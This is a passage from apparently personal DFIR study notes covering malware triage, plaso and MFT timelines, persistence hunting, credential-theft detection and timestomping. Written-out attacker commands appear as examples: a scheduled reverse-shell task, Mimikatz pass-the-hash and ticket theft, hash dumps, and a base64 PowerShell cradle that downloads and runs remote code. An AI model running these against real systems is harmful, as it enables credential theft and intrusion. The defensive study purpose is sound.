- Code injection capabilities?
- Triage detection using crowdsourced code patterns (rules)
  - File header
  - API Calls
  - Strings and Constants
  - Disassembly
- Rules match common malware actions
  - Communication, Host interaction, Persistence, Anti-analysis
  - ATT&CK technique mapping also included
- Designed to provide capabilities in plain language to speed-up investigations
- [capa](https://github.com/mandiant/capa)
- [capa: Automatically Identify Malware Capabilities](https://www.mandiant.com/resources/capa-automatically-identify-malware-capabilities)
- [Malware Behavior Catalog](https://github.com/MBCProject/mbc-markdown)

```bash
capa.exe -f pe -v <file>
```  

### UPX
- Unpack execuatbles

```bash
upx -d p_exe -o p_exe_unpacked
```  

<br>

### Putting It All Together
- Poor Density Score + No Digital Signature + Anomalistic Behavior - Known Good = Suspicious Files

<br>

## Malware Discovery Process

### yara

- Compile yara rules

```bash
yarac64.exe '.\rules\index.yar' yara-rules
```  

- Scan using yara

```bash
yara64.exe -C yara-rules -rw G:\ > 'C:\Tools\Malware Analysis\yara-rules-out.txt'
```  

<br>

### Sigcheck
- Copy the signature file directories from the triage image location ```C\Windows\System32\CatRoot``` to analysis machine location: ```C\Windows\System32\CatRoot```
- Change the last value from an E to a 9 fo each folder
- Restart Cryptographic Services

```bash
sigcheck.exe -s -c -e -h -v -vt -w 'C:\Tools\Malware Analysis\sigcheck-results.csv' G:\
```  

- Tune Out Known Good
- Tune Out Verified
- Tune Out Known Good Publishers
- Note Any 32 Bit
- Note n/a Publishers
- Note recent PE compliation timestamps

<br>

### DensityScout
```bash
densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
```

<br>

# Timeline Analysis

## Overview

### Benefits
- Examine System Activity
- Detect C2 Channels
- Extremely Hard for Anti-Forensics to Succeed -- Too many Time Entries
- Adversaries Leave Footprints Everywhere on System

<br>

### Forensic Trinity
- Filesystem Metadata
- Windows Artifacts
- Registry Keys

### Windows Artifacts
- [SANS Windows Forensic Analysis Poster](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Windows_Forensics_Poster.pdf)

<br>

### The Pivot Point
- Challenge: Where do I begin to look?
  - Use your scope and case knowledge to help form that answer
  - A timeline has many places where critical activity has occurred
  - Called a timeline pivot point
- Pivot Point: Point used to examine the temporal proximity in the timeline
  - Temporal proximity: What occured immediately before and after a specific event?
- Why a pivot point?
  - Use the pivot point to look before and after in your timeline to get a better idea of what happened on the system
  - Example: Program execution followed by multple writes to C:\Windows\System32 and updating registry entries
  - You can also use the "pivot point" to help identify potential malware by finding suspicious files and finding how they interact with the sytem via the timeline

<br>

<img alt="Micosoft's Attack Lifecycle" src="https://raw.githubusercontent.com/w00d33/w00d33.github.io/main/_files/pivot_points.PNG" />

<br>

### Contect Clues
- Recovering a single artifact is similar to recovering a single word
- Seeing the context surrounding the artifact is needed to accurately use timeline
- Example -> sweet
  - 1. Sarah is such a sweet little girl; she is always looking after her brother
    - Sweet = kind and friendly
  - 2. This tea is too sweet for me to drink! How much sugar is in it?
    - sweet = a taste similar to sugar

<br>

### Timeline Capabilities
- Filesystem: ```fls or MFTECmd```  
  - Filesystem metadata only
  - More filesystem types
    - Apple (HFS)
    - Solaris (UFS)
    - Linux (EXT)
    - Windows (FAT/NTFS)
    - CD-ROM
  - Wider OS/Filesystem capability

<br>

- Super Timeline: ```log2timeline```  
  - Obtain everything (Kitchen Sink)
  - Filesystem metadata
  - Artifact timestamps
  - Registry timestamps

<br>

### Analysis Process
1. Determine Timeline Scope: What questions do you need to answer?
2. Narrow Pivot Points
  - Time-based
  - Artifact based
3. Determine the Best Process for Timeline Creation
  - Filesystem-Based Timeline Creation -- FLS or MFTECmd - Fast (Triage Mode)
  - Super Timeline Creation - Automated or Targeted - LOG2TIMELINE
4. Filter Timeline
5. Analyze Timeline
  - Focus on the context of evidence
  - Use Windows Forensic Analysis Poster "Evidence of..."

<br>

## Filesystem Timeline Creation and Analysis

**Tools Will Parse**
- Filesystem Metadata
  - Directories
  - Files
    - Deleted Files
    - Unallocated Metadata

**Collect Times From**
- Data Modified (M)
- Data Access (A)
- Metadata Change (C)
- File Creation (B)

**Timelines Can Be Created For Many Filesystem Types**
- NTFS
- FAT12/16/32
- EXT2/3/4
- ISO9660 -CDROM
- HFS+
- UFS1&2

<br>

### NTFS Timestamps
- **M: Data Content Change Time (Focus)**
  - Time the data content of a file was modified
- A: Data Last Access Time
  - Approximate Time when the file data last accessed
- C: Metadata Change Time
  - Time this MFT record was last modified
  - When a file is renamed, size changes, security permissions update, or if file ownership is changed
- **B: File Creation Time (Focus)**
  - Time file was created in the volume
- UTC Time Format (NTFS)
- Local Time (FAT)

<br>

<img alt="Micosoft's Attack Lifecycle" src="https://raw.githubusercontent.com/w00d33/w00d33.github.io/main/_files/macb.PNG" />

<br>

### Timestamp Rules Exceptions
- Applications
  - Office Products
  - Winzip
  - Updates access times (randomly)
- Anti-Forensics
  - Timestomping
  - Touch
  - Privacy cleaners
- Archives
  - ZIP, RAR, and RGZ
  - Retains original date/timestamps
  - Usually affects modified time only
- Scanning
  - Depends on how well the A/V is written

<br>

### Understanding Timestamps - Lateral Movement Analysis
- File copied to remote system
  - Created time: Time of copy (possible time of lateral movement)
  - Modification time: maintains the original modification time
  - Use as a "Pivot Point"

<br>

### Filesystem Timeline Format
- Columns
  - Time: All entries kwith the same time are grouped
  - macb: Indication of timestamp type
  - File Size
  - Permissions (Unix Only)
  - User and Group (Unix Only)
  - Meta: Metadata address ($MFT record number for NTFS)
  - File Name
    - Deleted files are appended with "deleted"

<br>

### Create Triage Timeline Bodyfile Step 1 - MFTECmd.exe
- -f "filename" ($MFT, $J, $BOOT, $SDS)
- --csv "dir" (directory to save csv, tab separated)
- --csvf name (Dir to save csv)
- --body "dir" (Dir to save CSV)
- --bodyf "name" (File name to save CSV)
- --bdl "name" Drive letter (C, D, etc.) to use with body file
- --blf (When true, use LF vs CRLF for newlines. Default is false)

```bash
MFTECmd.exe -f "E:\C\$MFT --body "G:\timeline" --bodyf mft.body --blf --bdl C:
```

<br>

### Create Triage Timeline Body File Step 1 - fls
- The fls tool allows use to interact with a forensics image as though it were a normal filesystem
- The fls tool in the Sleuth Kit can be used to collect timeline information from the filename layer
- It take the inode value of a directory, processes the contents, and displays the filenames in the directory (including deleted items)

<br>

### Create Triage Image Timeline Step 2 - mactime
- The mactime tool is a perl script that takes bodyfile formatted files as input
- It can be given a date range to restrict itself or it can cover the entire time range
- "-z" i the output time zone to use. We highly recommend standardizing on UTC to match other artifacts and eliminate timezone and daylight savings challenges 

```bash
mactime [options] -d -b boddyfile -z timezone > timeline.csv
```

<br>

# Super Timelines

## Lateral Movement Example
0.  Found a suspicious prefetch file (evil.exe) and birth timestammp (first time executed)
1. Scroll Up and find an authentication event (annotate account)
  - 4672 (Admin Logon)
  - 4624 (Login Successful)
  - 4776
  - Logon Type 3 (network)
2. Focus on M times and B times
  - Evidence of File Copy (evil.exe M time older than B)
3. Execution event
  - Prefetch (B - First Run, M - Additional Run Times)
  - Identify time gaps in between file transfers and execution
4. Directory creation event (...b)
5. Regisitry Modification
  - "REG"
  - Example: ```HKLM\...\services\Netman\domain] home: http://13.192.235/ads pause: 64```
  - M...
6. More File Execution
  - .A.B (first executed)

<br>

## Malware Execution Example
0. Identify suspicious execution event
1. Scroll Up and find an authentication event (annotate account)
  - 4672 (Admin Logon)
  - 4624 (Login Successful)
2. File Creation
  - .A.B
  - Run capa, sigcheck, yara, densityscout
3. New Service Created
  - 7045 Created
  - 7036 Started
4. File Execution
5. File Creation
  - .A.B
6. Logoff
  - 4634

<br>

## Process
1. log2timeline - Extract timeline
2. psort - Post processing and output
3. pinfo - Display storage metadata

<br>

## log2timeline usage
```bash
log2timeline.py [STORAGE FILE] [SOURCE]
```  

- STORAGE FILE: Plaso output database file ```/path/to/output.dump```
- SOURCE: Device, image, or directory of files to be parsed ```/path/to/image/dd```
- -z: Define the timezone of the system being investigated (not the output). IF a forensic image is provided (e.g. E01, raw), the timezone wil lbe identified automatically
- --z "timezone": list of available timezones
- --help: list all options with usage descriptions
- [Plaso](https://plaso.readthedocs.io/en/latest/)

<br>

## Target Examples
- Raw Image
```bash
log2timeline.py /path-to/plaso.dump /path-to/image.dd
```  
- EWF Image
```bash
log2timeline.py /path-to/plaso.dump /path-to/image.E01
```  
- Virtual Disk Image
```bash
log2timeline.py /path-to/plaso.dump /path-to/triage.vhdx
```  
- Physical Device
```bash
log2timeline.py /path-to/plaso.dump /dev/sdd
```  
- Volume via Partition Num
```bash
log2timeline.py --partition 2 /path-to/plaso.dump /path-to/image.dd
```  
- Triage Folder
```bash
log2timeline.py /path-to/plaso.dump/ /triage-output/
```  
<br>

## Targeted Timeline Creation
- Parsers
  - [Plaso Parsers](https://plaso.readthedocs.io/en/latest/sources/user/Parsers-and-plugins.html)
  - ```log2timeline.py --parsers "win7,!filestat" plaso.dump <target>```  
- Filter Files
  - Allows for targeted analysis
  - Supports text-based or YAML
    - Regex
    - Wildcards
    - Path recursions
    - Path variables
  - [Filter Files](https://plaso.readthedocs.io/en/latest/sources/user/Collection-Filters.html)
  - [Filter Files Plaso Github](https://github.com/log2timeline/plaso/tree/main/data)
- Grab Kape Triage Image -> Run through plaso: ```log2timeline.py /path-to/plaso.dump/ /triage-output/```  

<br>

## Filtering Super Timelines

### pinfo.py
- Displays contents of Plaso database
  - -v for "verbose" information
- Information stored inside the plaso.dump storage container
  - Info on when and how the tool was run
- List of all plugins/parsers used
- Filter file information (if applicable)
- Information gathered during the preprocessing stage
- A count of each artifact parsed
- Errors and storage container metadata

```bash
pinfo.py -v plaso.dump
```  

<br>

### psort.py
- --output-time-zone ZONE - Converts stored times to specified time zone
- -o FORMAT: -  Chose the output modile (default is "dynamic" minimal CSV)
  - l2tcsv - Traditional CSV format used by log2timeline
  - elastic - Sends result into an Elasticsearch database
- -w FILE - Name of output file to be written
- FILTER - Filter arguement (e.g., provide a date range filter)
  - ```date > datetime ('2018-08-23T00:00:00') AND date < datetime ('2018-09-07T00:00:00')``` 

```bash
psort.py --output-time-zone 'UTC' -o l2tcsv -w supertimeline.csv plaso.dump FILTER
```  
<br>

### Case Study: Web Server Intrusion
- Step 1: Parse Triage Image from Web Server
```bash
log2timeline.py 'EST5EDT' --parsers 'winevtx, winiis' plaso.dump /cases/IIS_Triage_Files
```  
- Step 2: Add fill MFT Metadata
```bash
log2timeline.py 'EST5EDT' --parsers 'mactime' plaso.dump /cases/IIS/mftecmd.body
```  
- Step 3: Filter Timeline
```bash
psort.py  --output-time-zone 'UTC' -o l2tcsv -w supertimeline.csv plaso.dump "date > datetime ('2018-08-23T00:00:00') AND date < datetime ('2018-09-07T00:00:00')"
``` 

## Super Timeline Analysis

### Recommended Columns
- date
- time
- MACB
- sourcetype
- source
- desc
- filename
- inode
- extra

### Colorize Timeline
- Automatically colorized in Timeline Explorer
- CTRL-T: Tag or untag selected rows
- CTRL-D: Bring up details (for use with supertimelines)
- CTRL-C: Copy selected cells (and headers) to clipboard
- CTRL-F: Show Find dialog
- CTRL-Down: Select Last Row
- CTRL-Shift-A: Select all values in current column
- Wildcards are supported in column filters
- [Colorized Super Timeline Template for Log2timeline Output Files](https://www.sans.org/blog/digital-forensic-sifting-colorized-super-timeline-template-for-log2timeline-output-files/)

<br>

### Super Timeline Creation

- Create Body File of Master File Table
```bash
MFTECmd.exe -f '.\Location\C\$MFT' --body 'D:\Path\To Save\Timeline' --bodyf hostname-mftecmd.body --blf --bdl C:
```  

<br>

- Convert body file to csv (triage timeline)
```bash
mactime -z UTC -y -d -b hostname-mftecmd.body > hostname-filesystem-timeline.csv
```  

<br>

- Tune out unnecessary noise
```bash
grep -v -i -f timeline_noise.txt hostname-filesystem-timeline.csv > hostname-filesystem-timeline-final.csv
```  

<br>

- List Timezones
```bash
log2timeline.py -z list
```

<br>

- Timeline Windows artifacts
```bash
log2timeline.py -z 'PST8PDT' --parsers 'win7,!filestat' --storage-file ../plaso.dump triage_image/2021-11-20T012359_hostname.vhdx
```  

- Add Master File Table
```bash
log2timeline.py --parsers 'mactime' --storage-file ../plaso.dump ./hostname-mftecmd.body
```  

- Convert Super Timeline to CSV
```bash
psort.py --output-time-zone 'UTC' -o l2tcsv -w ./plaso.csv ./plaso.dump "(((parser == 'winevtx') and (timestamp_desc == 'Creation Time')) or (parser != 'winevtx'))"
```  

<br>

```bash
grep -a -v -i -f timeline_noise.txt plaso.csv > hostname-supertimeline-final.csv
```  

<br>

## Supertimeline Analysis

### Questions to Answer
- When were suspicous directories created?
- What is the MFT-Entry value (from the "Meta" column)?
- What is the last modification time for the folder?
  - The last modification time of a folder represents a change in the contents of the directory
- When were suspicious files created?
- Find the prefetch of suspicious executables
- Dowloaded or Transfered Files?
  - Downloaded Indicator: zone.identifier
- Identify when users logged in for the first time
  - Creation of a user profile folder generally marks the first interactive logon session of that user on a system
- LNK files provide evidence of file and folder opening
  - Review the LNK files present in the ```C:/Users/<user>/AppData/Roaming/Microsoft/Windows/Recent``` directory

<br>

### Filtering
- Filter for "AppCompatCache Registry Entry" in the "Source Description" column
  - Adding the "Type" column can help with interpretation of the timestamps
- Use the Power Filter to find all rows with the value "/filename"
  - Click Line showing the creation of indicator
  - Clear your Power Filter ("X"), allowing you to see all of the activity around the creation of that suspicious file
- Select "Registry Key: RDP Connection", and examine the output
  - Notice that the "File Name" column identifies this data as coming from the NTUSER.DAT registry file
- Search for "Recycle" in your Power Filter
  - What user RID (the last 3-4 digits of the SID) is responsible for all of the Recycle Bin activity
- Filter for "Registry Key: BagMRU" (Folder Opening)
- GUI program execution using a filter for the artifact "Registry Key: UserAssist"

<br>

---

<br>

# Threat Hunting

## Common Malware Names
* [The typographical and homomorphic abuse of svchost.exe, and other popular file names](https://www.hexacorn.com/blog/2015/12/18/the-typographical-and-homomorphic-abuse-of-svchost-exe-and-other-popular-file-names/)

<br>

## Common Malware Locations
* [Digging for Malware: Suspicious Filesystem Geography](http://www.malicious-streams.com/resources/articles/DGMW1_Suspicious_FS_Geography.html)

<br>

## Living of the Land Binaries
* [LOLBAS Project](https://lolbas-project.github.io/)  

**RUNONCE.EXE**
- Executes a Run Once Task that has been configured in the registry
```
Runonce.exe /AlternateShellStartup
```

**RUNDLL32.EXE**
- Used by Windows to execute dll files
```
rundll32.exe AllTheThingsx64,EntryPoint
```

**WMIC.EXE**
- The WMI command-line (WMIC) utility provides a command-line interface for WMI
```
wmic.exe process call create calc
```

**NETSH.EXE**
- Netsh is a Windows tool used to manipulate network interface settings.
```
netsh.exe add helper C:\Users\User\file.dll
```

**SCHTASKS.EXE**
- Schedule periodic tasks
```
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
```

**MSIEXEC.EXE**
- Used by Windows to execute msi files
```
msiexec /quiet /i cmd.msi
```

<br>

## Persitence Locations

### Common Autostart Locations
```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows\CurrentVersion\Runonce
SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

**Tools**
* Autoruns
* Kansa

<br>

### Services
```
HKLM\SYSTEM\CurrentControlSet\Services
```
* 0x02 = Automatic
* 0x00 = Boot Start of a Device Driver
* "sc" command can create services

**Tools**
* Autoruns
* "sc" command
* Kansa

<br>

### Scheduled Tasks
- at.exe
	- Deprecated but present in WinXP and Win7+
	- Recorded in at.job files and schdlgu.txt (XP)
- schtasks.exe
	- Activitiy logged in Task Scheduler and Security Logs

```powershell
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
```

Tools:
- Autoruns
- Kansa

<br>

### DLL Hijacking

DLL Search Order Hijacking
- Place malicious file ahead of DLL in search order
- Windows looks at Application directory prior to Windows/System32 folder
- Look at exe's import table
- Exception: DLLs present in the KnownDLLs Registry Key

Phantom DLL Hijacking
- Find DLLs that applications attempt to load, but doesn't exist

DLL Side Loading
- WinSXS provides a new version of a legit DLL

Relative Path DLL Hijacking
- Copy target .exe and corresponding bad .dll to a different location

Common DLL Search Order
1. DLLs already in memory
2. Side-by-side components
3. KnownDLLs List
4. Directory of the application
5. C:\Windows\System32
6. C:\Windows\System
7. C:\Windows
8. Current Directory
9. System %PATH%

<br>

### Hunting DLL Hijacking
- Machines rarely get new dlls (Application Install/Patching)

File system analysis
- Look for new or unsigned .exe/.dll files in unusual places

Memory Analysis
- Find system process or DLLs loaded from the wrong location

This technique is often followed up C2 network beaconing

<br>

### WMI Event Consumer Backdoors
- Allows triggers to be set that will run scripts and executables
- Event Filter: Trigger Condition
- Event Consumer: Script or executable to run
- Binding: Combine Filter and Consumer

Tools
- Kansa
- Autoruns

Discover Suspicious WMI Events
```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __Event Consumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```
<br>

### Hunting WMI Persistence
- Look at consumers (CommandLine and Active Script)
	- Correlate to Event Filter (trigger)
- Search
	- .exe
	- .vbs
	- .ps1
	- .dll
	- .eval
	- ActiveXObject
	- powershell
	- CommandLineTemplate
	- ScriptText
- Common WMI Occurences
	- SCM Event Log Consumer
	- BVTFilter
	- TSlogonEvents.vbs
	- TSLogonFilter
	- RAevent.vbs
	- RmAssistEventFilter
	- KernCap.vbs
	- NETEventLogConsumer
	- WSCEAA.exe (Dell)

<br>

### Hunt and Analyze Persistence with Autoruns
- Live System Only
- Works for Autostart locations, Services, Scheduled Tasks, WMI Events
- Hashes files and can search VirusTotal for hits

1. Run autorunsc
 ```
 C:\>autorunsc -accepteula -a * -s -h -c -vr > \\server\share\autoruns.csv
 ```
2. Open .csv with tool of choice (e.g. Excel or TimelineExplorer)
3. Filter out trusted startup locations
	- Use signers to filter trusted code signers (can lead to false negative but is still a good place to start)
	- Look for:
		- (Not Verified)
		- Unfamiliar Signers
		- Blank (No Signer)
4. Filter by Enabled (Active)
5. Compare hashes to VirusTotal
6. Research vendor and product listed in "Publisher" and "Description" fields
7. Compare output to a the output of a known good machine

<br>

## Lateral Movement

### Detecting Credential Harvesting
- Event Logs
	- 4624 Logons
	- 4720 Account Creation
	- 4776 Local Account Auth
	- 4672 Privileged Account Usage
- Unix "secure"logs
- Auditing New Accounts
- Anomalous Logins
	- Workstation to Workstation
	- Sensitive Networks
- After Hour Logins

**Mitigations (Win10)**
- Credential Guard: Moves credentials (hashes & ticket) into virtual enclave
- Remote Credential Guard: RDP without pushing credentials to remote target
- Device Guard (Prevent execution of untrusted code)

**Hunt Notes**
- WDigest Plaintext Credentials
	- HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest
		- UseLogonCredential = "1" (Should be 0)

<br>

### Hashes
- Availabe in the LSASS process
- Can be extracted with admin privileges
- Local account password hashes are available in the SAM hive in memory or on disk
- Domain account hashes are present in memory during interactive sessions

**Common Tools**
- Mimikatz
- fgdump
- gsecdump
- Metasploit
- AceHash
- PWDumpX
- creddump
- WCE

**Pash-the-Hash Attack**
- Authenticate using a stolen account hash without knowing the cleartext password
	- Tools: Metasploit PsExec module, WCE, and SMBshell
- Limited to NTLM authentication
- Often used to map shares, perform PsExec-style remote execution, and WMI
- [Protecting Privileged Domain Accounts: Safeguarding Password Hashes](https://www.sans.org/blog/protecting-privileged-domain-accounts-safeguarding-password-hashes/)
- [Slides on Mimikatz 2.0](https://lira.epac.to/DOCS-TECH/Hacking/Mimikatz/Benjamin%20Delpy%20-%20Mimikatz%20a%20short%20journey%20inside%20the%20memory%20of%20the%20Windows%20Security%20service.pdf)
- [Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft, Version 1 and 2](https://www.microsoft.com/en-us/download/details.aspx?id=36036)

**Examples**
- Hash dump with Gsecdump
```
gsecdump.exe -a > 1.txt
```

- Pass the Hash (Mimikatz)
```
mimikatz # sekurlsa::pth /user:username /domain:computername /ntlm:hash /run:".\psexec.exe -accepteula \\10.10.10.10 cmd.exe"
```

<br>

### Credential Availability on Targets

| **Admin Action** | **Logon**<br>**Type** | **Credentials**<br>**on Target?** | **Notes** |
| :---------------: | :---------------: | :---------------: | :---------------: |
| Console Logon | 2   | Yes*   |   *Except when Credential Guard is enabled  |
| RunAs | 2   | Yes*   |  *Except when Credential Guard is enabled    |
| Remote Desktop | 10   | Yes*   | *Except when Remote Credential Guard is enabled    |
| Net Use | 3   | No   | Including /u:parameter    |
| PowerShell Remoting | 3   | No   | Invoke-Command; Enter-PSSession   |
| PsExec Alternate Creds | 3+2   | Yes    | -u <<username>> -p <<password>>   |
| PsExec w/o Explicit Creds | 3   |  No   |    |
| Remote Scheduled Task | 4   | Yes    | Password saved as LSA Secret   |
| Run as a Service | 5   | Yes    | (w/user account)-Password saved as LSA Secret   |
| Remote Registry | 3   | No    |    |

<br> 

### Tokens
- Targets user sessions and running services
- Used for SSO
- Attacker can impersonate user's security context
- ```SeImpersonate``` privileges let tokens be copied from processes (also SYTEM or admin)
- Can allow adding user or managing group membership, mapping of remote shares, or Running PsExec (delegate tokens only)
- Often used to escalate from local to domain admin

**Token Stealing (Mimikatz)**
- Assumes attacker has local admin
```
mimikatz # privilege::debug
mimikatz # token:whoami
mimikatz # token:elevate /domain admin (identifies any domain admins present on the system)
```

**Common Tools**
- Incognito
- Metasploit
- PowerShell (PowerShell Empire)
- Mimikatz

**Hunting**
- [Monitoring for Delegation Token Theft](https://www.sans.org/blog/monitoring-for-delegation-token-theft/)

<br>

### Cached Credentials
- Stored domain credentials to allow logons when off domain
- Cached credentials hashes have to be cracked
- Salted and case-sensitive (slow to crack)
- Cannot be used in pass the hash
- Stored in the SECURITY\Cache registry key
- Admin or SYSTEM privileges required
- Hashes cracked with John the Ripper or hashcat

**Common Tools**
- cachedump
- Metasploit
- PWDumpX
- creddump
- AceHash

**Cached Credential Extraction with Creddump**

```./pwdump.py SYSTEM SAM true``` <- Local NT Hashes  
```./cachedump.py SYSTEM SECURITY true``` <- Cached Hashes


<br>

### LSA Secrets
- Credential stored in registry to allow services or tasks to be run with user privileges
- May also hold application passwords like VPN or auto-logon credentials
- Admin privileges allow access to encrypted registry data and keys necessary to decrypt
	- Stored SECURITY/Policy/Secrets
	- Parent key in SECURITY/Policy can decode
- Passwords are plaintext

<br>

### Decrypt LSA Secrets with Nishang
- Requires Admin
- Gain permissions necessary to access the Security registry hive with ```Enable-DuplicateToken```
- Dump registry data with ```Get-LsaSecret.ps1```  

**Common Tools**
- Cain
- Metasploit
- Mimikatz
- gsecdump
- AceHash
- creddump
- PowerShell

<br>

### Tickets - Kerberos
- Kerberos issues tickets to authenticated users
- Cached in memory and valid for 10 hours
- Tickets can be stolen from memory and used to authenticate else where (Pass the Ticket)
- Access to the DC allows tickets to be created for any user with no expiration (Golden Ticket)
- Service account tickets can be requested an forged, including offline cracking of service account hashes (Kerberoasting)

**Common Tools**
- Mimikatz
- WCE
- kerberoast

<br>

### Pass the Ticket with Mimikatz
- Dump Tickets
```mimikatz # sekurlsa::tickets /export```
- Import ticket elsewhere
```mimikatz # keberos::ptt [ticket]```
- Now available to authenticate to throughout environment

<br>

### Kerberos Attacks
- Pass the Ticket
	- Steal Ticket from memory and pass or import on other systems
- Overpass the Hash
	- Use NT hash to request a service ticket from the same account
- Kerberoasting
	- Request service ticket for highly privileged service and crack NT hash
- Golden Ticket
	- Kerberos TGT for any account with no expiration. Survives full password reset
- Silver Ticket
	- All-access pass for a single service or computer
- Skeleton Key
	- Patch LSASS on domain controller to add backdoor password that works for any domain account
- DCSync
	- Use fake Domain Controller replication to retrieve hashes (and hash history) for any account without login to the DC
- [PROTECTING WINDOWS NETWORKS – KERBEROS ATTACKS](https://dfirblog.wordpress.com/2015/12/13/protecting-windows-networks-kerberos-attacks/)

<br>

### NTDS.DIT
- Active Directory Domain Services (AD DS) database holds all user and computer account hashes (LM/NT) in the domain
- Encrypted but algorithm is easy to decrypt
- Located in the \Windows\NTDS folder on Domain Controller
- Requires admin accessto load driver to access raw disk or use Volume Shadow Copy Service

**Common Tools**
- ntdsutil
- VSSAdmin
- NTDSXtract
- Metasploit
- PowerShell
- secretsdump.py

<br>

### Bloodhound - Find a Path to Domain Admin
- Active Directory relationship graphing tool
	- Nodes: Users, Computers, Groups, OUs, GPOs
	- Edges: MemberOf, HasSession, AdminTo, TrustedBy
	- Paths: A list of nodes connected by edges (Path to Domain Admin)
	- Visualizes dangerous trust relationships and misconfigurations
	- Reduces brute-force effort required
	- Difficult to detect (Uses prodominantly LDAP)
		- Uses cached LDAP connections
	- [Automating the Empire with the Death Star: getting Domain Admin with a push of a button](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html)
		- Uses PowerShell Empire to enumerate accounts, perform cred theft, and lateral movement
	- [GoFetch](https://github.com/GoFetchAD/GoFetch)
		- Automates BloodHound findings
		- Uses ```Invoke-Mimikatz``` and ```Invoke-Psexec``` to auto cred theft and lateral movement
	- [BloodHound](https://github.com/BloodHoundAD/BloodHound)

	<img alt="BloodHound" src="https://i0.wp.com/wald0.com/wp-content/uploads/2017/05/TransitiveControllers.png?ssl=1" />


<br>

---

<br>

# Misc

## Decode Base64

```bash
echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA" | base64 -d | iconv -f UTF-16LE -t UTF-8
```

<br>

# Anti-Forensics

## Overview

### Filesystem
- Timestomping
- File Deletion
- File/Free Space Wiping
- Data Encryption (.rar files)
- Fileless Malware

<br>

### Registry
- Registry Key/Value Deletion
- Registry Key/Value Wiping
- Hiding Scripts in Registry

<br>

### Other
- Event Log Deletion/Tampering
- Process Evasion - Rootkits and Code Injection

<br>

## Recovery of Deleted Files via VSS

### Volume Shadow Copies
- Can provide backups of nearly the entire volume to earlier points in time
- Recover key files (event logs, registry, malware, wipe files)
- Introduction of "ScopeSnapshots" in Windows 8+ limits effectiveness (excludes user profiles)
  - Disable by setting ```HKLM\Software\Microsoft\WindowsNT\CurrentVersion\SystemRestore``` to 0

<br>

### Volume Shadow Examination
- Triage Analysis
  - KAPE
  - Velociraptor
- Full-Volume Analysis
  - Arsenal Image Mounter
  - F-Response
  - vshadowmount
- Analysis on SIFT VM
  - vshadowinfo
  - vshadowmount

<br>

## Advanced NTFS Filesystem Tactics

### Master File Table - MFT
- Metdata layer contains data that describes files
- Containers point to:
  - Data layer for file content
  - MAC times
  - Permissions
- Each metadata structure is given a numeric address

<br>

### MFT Entry Allocated
- Metadata filled out (name, timestamps, permissions, etc.)
- Pointers to clusters containing file contents (or the data itself, if the file is resident)

<br>

### MFT Entry Unallocated
- Metadata may or may not be filled out
- If filled out, it is from a deleted file (or folder)
- The clusters pointed to may or may not still contain the deleted file's data
  - The clusters may have been resused

<br>

### Sequential MFT Entries
- As files are created, regardless of their directories, MFT allocation patterns are generally sequential and not random
- Use analysis of contiguous metadata values to find files likely created in quick succession, even across different directories

<br>

### istat - Analyzing File System Metadata
- Displays statistics about a given metadata structure (inode), including MFT entries
- Supports dd, E01, VMDK/VHD
- Supports NTFS, FAT12/16/32 , ExFAT, EXT2/3/4, HFS, APFS
- Provides allocation status
- Includes MFT entry number
- $LogFile Sequence Number
- $STANDAR_INFORMATION
  - File or Folder attributes (ReadOnly, Hidden, Archived, etc.)
  - Security Information
  - USN Journal's Sequence Number
  - Timestamps
    - Created
    - Data Modified
    - MFT Metadata Modified
    - Data Last Accessed
- $FILENAME
  - File or Folder attributes (ReadOnly, Hidden, Archived, etc.)
  - Name of File or Directory
  - Contains parent directory MFT Entry
  - Four more timestamps
- Attribute List
  - The file has 2 $FN attributes
    - One for the long file name
    - Another for the short file name
    - One $DATA attribute

<br>

<img alt="FILE_NAME_MACB" src="https://raw.githubusercontent.com/w00d33/w00d33.github.io/main/_files/FILE_NAME_MACB.PNG" />

<br>

### Detecting Timestamp Manipulation
- Timestomping is common with attackers and malware authors to make their files hide in plain sight
- Artifacts from Timestomping vary based on the tool used
- Anomalies:
  1. $STANDARD_INFORMATION "B" time prior to $FILE_NAME "B" time
  2. Fractional second values are all zeros
  3. $STANDARD_INFORMATION "M" time prior to ShimCache timestamp
  4. $STANDARD_INFORMATION times prior to executable's compile time
  5. $STANDARD_INFORMATION times prior to $I30 slack entries
  6. MFT entry number is significantly out of sequence from expected range

<br>

### Timestomp Detection
- MTFECmd
  - Created0x10 = $STANDARD_INFORMATION
  - Created0x30 = $FILE_NAME
  - Compare and look for mismatches
  - (1) Column ```SI<FN``` ($FILE_NAME time more recent than $STANDARD_INFORMATION time)
  - (2) Column ```u Sec``` Checks for zeroed out nano second value

- exiftool
  - Parse application metadata
  - (4) Compile time (Time Stamp) more recent than either creation time or modification time

- AppCompatCacheParser.exe
  - (3) Compare Last Modificaiton time (more recent) to the file systems last modification time

<br>

### Analyzing $DATA
- File data is maintained by the $DATA attribute
  - Resident: If data is 600 bytes or less, it gets stored inside the $DATA attribute
  - Non-resident: $DATA attribute lists the clusters on disk where the data resides
- Files can have multiple $DATA streams
  - The extra, or "Alternate Data Streams" (ADS), must be named

  <br>

### Extracting Data with The Sleuth Kit - icat
```
